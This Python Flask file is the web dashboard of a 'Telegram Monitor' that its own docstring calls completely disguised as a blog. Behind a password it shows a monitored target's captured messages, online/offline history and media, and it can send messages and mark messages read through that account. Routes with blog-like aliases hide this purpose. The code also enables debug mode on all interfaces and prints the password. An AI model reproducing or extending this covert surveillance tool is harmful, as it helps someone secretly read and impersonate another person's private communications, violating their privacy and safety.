#!/usr/bin/env python3
"""
Web Dashboard v5 (Blog) for Telegram Monitor
Looks like a blog/forum - completely disguised.
"""

import os
from functools import wraps
from flask import Flask, render_template, request, redirect, url_for, session, jsonify, send_from_directory

import config
import database

app = Flask(__name__)
app.secret_key = config.SECRET_KEY + "_v5"

# Ensure media folder exists
os.makedirs(config.MEDIA_PATH, exist_ok=True)

# Your display name
MY_NAME = getattr(config, 'MY_NAME', None) or "Me"

# Blog dashboard runs on port + 1
BLOG_PORT = config.DASHBOARD_PORT + 1


def login_required(f):
    """Decorator to require login for routes."""
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if not session.get('logged_in'):
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorated_function


@app.route('/login', methods=['GET', 'POST'])
def login():
    """Login page."""
    error = None
    if request.method == 'POST':
        password = request.form.get('password', '')
        if password == config.DASHBOARD_PASSWORD:
            session['logged_in'] = True
            return redirect(url_for('messages'))
        error = 'Invalid credentials'
    return render_template('login_v5.html', error=error)


@app.route('/logout')
def logout():
    """Logout and clear session."""
    session.clear()
    return redirect(url_for('login'))


@app.route('/')
@login_required
def index():
    """Redirect to messages."""
    return redirect(url_for('messages'))


@app.route('/articles')
@app.route('/messages')
@login_required
def messages():
    """View message history as blog posts."""
    page = request.args.get('page', 1, type=int)
    per_page = 50
    offset = (page - 1) * per_page

    msgs = database.get_messages(limit=per_page, offset=offset)
    stats = database.get_message_stats()

    # Reverse to show oldest first
    msgs = list(reversed(msgs))

    return render_template('messages_v5.html',
                         messages=msgs,
                         stats=stats,
                         page=page,
                         has_more=len(msgs) == per_page,
                         my_name=MY_NAME)


@app.route('/activity')
@app.route('/status')
@login_required
def status():
    """View online/offline history."""
    page = request.args.get('page', 1, type=int)
    per_page = 100
    offset = (page - 1) * per_page

    history = database.get_online_history(limit=per_page, offset=offset)

    return render_template('status_v5.html',
                         history=history,
                         page=page,
                         has_more=len(history) == per_page)


@app.route('/gallery')
@app.route('/files')
@login_required
def media_gallery():
    """View media gallery."""
    page = request.args.get('page', 1, type=int)
    filter_type = request.args.get('type', None)
    per_page = 50
    offset = (page - 1) * per_page

    media = database.get_media_messages(limit=per_page, offset=offset, media_type=filter_type if filter_type else None)
    stats = database.get_media_stats()

    return render_template('media_v5.html',
                         media=media,
                         stats=stats,
                         page=page,
                         filter_type=filter_type,
                         has_more=len(media) == per_page,
                         my_name=MY_NAME)


@app.route('/media/<path:filename>')
@login_required
def serve_media(filename):
    """Serve media files."""
    return send_from_directory(config.MEDIA_PATH, filename)


@app.route('/comment', methods=['POST'])
@app.route('/send', methods=['POST'])
@login_required
def send_message():
    """Queue a message to be sent."""
    text = request.form.get('text', '').strip()
    if text:
        database.queue_outgoing_message(text)
    return redirect(url_for('messages'))


@app.route('/mark-read', methods=['POST'])
@login_required
def mark_read():
    """Queue a message to be marked as read."""
    message_id = request.form.get('message_id', type=int)
    chat_id = request.form.get('chat_id', type=int)
    if message_id and chat_id:
        database.queue_mark_read(message_id, chat_id)
    return redirect(url_for('messages'))


@app.route('/api/mark-read', methods=['POST'])
@login_required
def api_mark_read():
    """API endpoint to mark a message as read."""
    data = request.get_json() or {}
    message_id = data.get('message_id')
    chat_id = data.get('chat_id')
    if not message_id or not chat_id:
        return jsonify({'error': 'message_id and chat_id required'}), 400
    mark_id = database.queue_mark_read(message_id, chat_id)
    return jsonify({'success': True, 'id': mark_id})


@app.route('/api/mark-all-read', methods=['POST'])
@login_required
def api_mark_all_read():
    """API endpoint to mark all messages from target as read."""
    count = database.mark_all_messages_read(MY_NAME)
    return jsonify({'success': True, 'count': count})


if __name__ == '__main__':
    print("="*50)
    print("  TechNotes Blog Dashboard (v5)")
    print("="*50)
    print(f"  URL: http://0.0.0.0:{BLOG_PORT}")
    print(f"  Password: {config.DASHBOARD_PASSWORD}")
    print("="*50)
    app.run(
        host=config.DASHBOARD_HOST,
        port=BLOG_PORT,
        debug=True
    )
